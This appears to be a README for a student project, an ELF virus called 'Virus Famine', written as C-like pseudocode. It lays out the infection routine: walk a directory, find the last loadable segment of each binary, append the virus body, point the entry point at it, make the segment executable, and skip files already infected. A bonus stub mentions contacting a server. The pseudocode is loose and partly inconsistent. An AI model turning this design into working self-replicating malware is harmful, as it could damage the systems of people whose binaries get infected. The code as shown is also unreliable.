# Virus Famine

This virus is coded only for academic purposes, and is:

 - Inoffensif, as it only add an infection routine
 - Easily detectable by modern technics

# Pseudocode

## Main

First function called
easily changeable directory of interest

```c
void	main()
{
	start_virus = %rip;
	char **dir_path = "./test";

	infect_dir(dir_path, save_rip);
	bonus_function();
}
```

## infect dir

Need to manage errors of open and mmap

```c
void	infect_dir(char *dir_path, void *start_virus)
{
	dir = open_dir(dir_path);

	for file in dir:
		mem_file, file_size = mmap(file);
		if (NULL != (mem_file = infect_file(mem_file, file_size, start_virus)));
			save(file);
	return ;
}
```

## infect_file

the maestro function

```c
uint8_t	infect_file(void *file, size_t file_size, void *start_virus)
{
	// Check if file is good, and find last loadable segment
	elfphdr *phdr = find_phdr(file, file_size);
	if (phdr == NULL)
		return NULL;
	// Check if file already taken care of
	if (check_if_not_infected(start_virus, phdr + phdr->offset - VIRUS_SIZE))
		return NULL;
	// Extend file size if necessary
	file = extend_memory(file, file_size, phdr, VIRUS_SIZE);
	if (file == NULL)
		return NULL;
	// Find again the phdr
	elfphdr *phdr = find_phdr(file, file_size);
	// Inject self in file
	spot = file + (phdr->offset + phdr->size);
	memcopy(spot, start_virus, VIRUS_SIZE);
	file->e_entry = spot;
	phdr->rights += EXECUTE;
	phdr->size += VIRUS_SIZE;
	return file;
}
```

## find_phdr

Find the phdr corresponding to the segment of injection

```c
elfphdr	*find_phdr(void *file, size_t file_size)
{
	if (BAD == (MAGIC_NB || ENDIAN || 64bits))
		return NULL;
	if (PHDR_ARRAY_END < ENOUGH_SPACE)
		return NULL;
	for phdr in phdr_array:
		if last_loadable:
			best_phdr = phdr;
	return best_phdr;
}
```

## Checking if already infected

1st idea, might not be the right way

```c
uint8_t	check_if_not_infected(uint8_t *cave_self, unit8_t *cave_new)
{
	count = 0;
	for i in range(VIRUS_SIZE):
		if cave_self[i] == cave_new[i]:
			count += 1;
	if ((float)count / (float)VIRUS_SIZE > 0.9)
		return TRUE;
	return FALSE;
}
```

## Extend memory

Carefull on overflow

```c
void *extend_memory(file, file_size, phdr, VIRUS_SIZE)
{

	int space_available = file_size - (phdr->offset + phdr->size);
	int space_missing = space_available - VIRUS_SIZE;
	if space_missing < 0:
		new_file = mmap(space_missing);
		memcopy(new_file, file, file_size);
	return new_file;
}
```

## Bonus

```c
void bonus_function()
{
	whatever we want;
	will be nice to connect to a server to say hello;
	will be nice to change background image;
	will be nice to print in terminal an ascii pic of a cute kitten;
}
```
